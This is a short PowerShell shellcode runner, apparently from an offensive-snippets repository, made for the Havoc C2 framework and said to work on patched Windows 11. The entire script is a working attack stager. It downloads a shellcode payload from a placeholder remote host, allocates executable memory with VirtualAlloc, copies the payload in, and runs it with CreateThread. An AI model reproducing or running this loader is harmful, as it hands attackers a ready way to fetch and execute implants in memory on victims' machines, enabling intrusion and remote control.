# I tested this PoC on fully patched Windows 11 - 10/23/2022-.
# Made for Havoc C2.
# https://github.com/0xAbdullah/Offensive-Snippets/blob/main/PowerShell/PoC_ShellcodeRunner.gif
$PInvoke = @"
using System;
using System.Runtime.InteropServices;

public class PInvoke {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $PInvoke

[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://IP/Shellcode.bin')
$size = $buf.Length
[IntPtr]$addr = [PInvoke]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$handle = [PInvoke]::CreateThread(0, 0, $addr, 0, 0, 0)
[PInvoke]::WaitForSingleObject($handle, [uint32]"0xFFFFFFFF")
